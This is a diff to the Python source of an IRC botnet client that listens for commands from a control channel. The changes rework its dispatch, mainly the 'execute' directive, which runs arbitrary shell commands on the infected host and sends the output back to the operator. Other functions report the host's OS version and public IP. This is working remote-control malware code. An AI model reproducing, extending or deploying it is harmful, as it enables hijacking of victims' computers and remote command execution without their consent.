@@ -22,11 +22,10 @@ from sys import argv
 from random import randint
 
 def generateNick(os):
-	rannum = str(randint(0000, 9999))
+	rannum = str(randint(0, 9999))
 	return str(os[:3] + rannum)
 
 def execute(cmd):
-
 	#handling a multi-word command
 	cmdList = []
 	if (cmd.find(" ") != -1):
@@ -66,7 +65,6 @@ def sendData(data):
 	else:
 		irc.send('PRIVMSG ' + channel + " :" + data + '\r\n')
 
-
 #All of the possible functions that the botnet is capable of
 def reply(): #send back to IRC server that you are here
 	sendData("Yes I am here")
@@ -79,7 +77,6 @@ def iAmGood(): #send back to IRC server that you are good
 	sendData("I am good. And you?")
 
 def runAndSend(cmd): #take a single command, run it, return output
-	cmd = cmd[8:]#have to get rid of the "execute" in front
 	request = execute(cmd)
 	sendData(request)
 
@@ -102,8 +99,8 @@ def version():
 	sendData(platform.release())
 
 def getIP():
-	request = execute("curl icanhazip.com")
-	sendData(request)
+	my_ip = urllib2.urlopen('http://ip.42.pl/raw').read()
+	sendData(my_ip)
 
 #debugger
 DEBUG = 0
@@ -159,25 +156,16 @@ def parseCommand(command):
 
 	if INTERACT[1] and "PRIVMSG" in command: #check if we should respond or not and if we find privmsg, we're good!
 		lines = command.split("\n")
-		# print "numlines: '%d'" % len(lines)
 		if len(lines) > 2:
 			print "we got a bunch of lines...doing nothing"
 			return
 
 		header = command[:command.index("PRIVMSG")] #get everything before PRIVMSG
-		#print "1header is: '%s'" % header #print
 		if ":" in header: #check if there is a colon first, to avoid crashing
 			header = header[(header.index(":") + 1):] #get all after colon
-		#print "2header is: '%s'" % header
-		# lines = header.split(":")
-		# elif len(lines) > 1:
-		# 	header = lines[1] #get all after colon
 
-		# print "3header is: '%s'" % header
 		user = header[:header.index("!~")] #user sending message
-		print "user is '%s'" % user
 		host = header[(header.index("!~") + 2):header.index(" ")] #hostname and ip/domain name: 'blarg@1.2.3.4'
-		print "host is: '%s'" % host
 		hostname = host[:host.index("@")] #hostname: 'blarg'
 		client = host[(host.index("@") + 1):] #client/ip/domain name: '1.2.3.4' or 'blarg.com'
 
@@ -192,10 +180,6 @@ def parseCommand(command):
 			command = tempCommand[(tempCommand.index(':') + 1):].strip().lower()
 
 			print "Recieved %s from the CNC" % command #print command
-
-			#implementation of directive commands
-			if (command[:7] == "execute"):
-				runAndSend(command)
 
 			if INTERACT[0]: #if interactive shell is on
 				if "??finish" in command:
@@ -228,8 +212,8 @@ def parseCommand(command):
 				if command in commands.keys(): #if regular command
 					commands[command]() #call appropriate function
 					print "function called"
-				elif "execute(" in command: #if they want the execute command, make that work
-					runAndSend(command[command.index("execute(") + 8:command.index(")")].strip())
+				elif command[:7] == "execute": #if they want the execute command, make that work
+					runAndSend(command[8:])
 				else: #if not recognized
 					print "command '%s' not defined" % command
 		else:
@@ -277,7 +261,6 @@ irc.send("JOIN "+ channel +"\n") #join the channel
 #infinite loop to listen for messages aka commands
 while 1:
 	text=irc.recv(1024)  #receive up to 1024 bytes
-	# lines = text.split("\n") #split commands based on new lines
 
 	#The two lines below are required by the IRC RFC, if you remove them the bot will time out.
 	if text.find('PING') != -1: #check if 'PING' is found
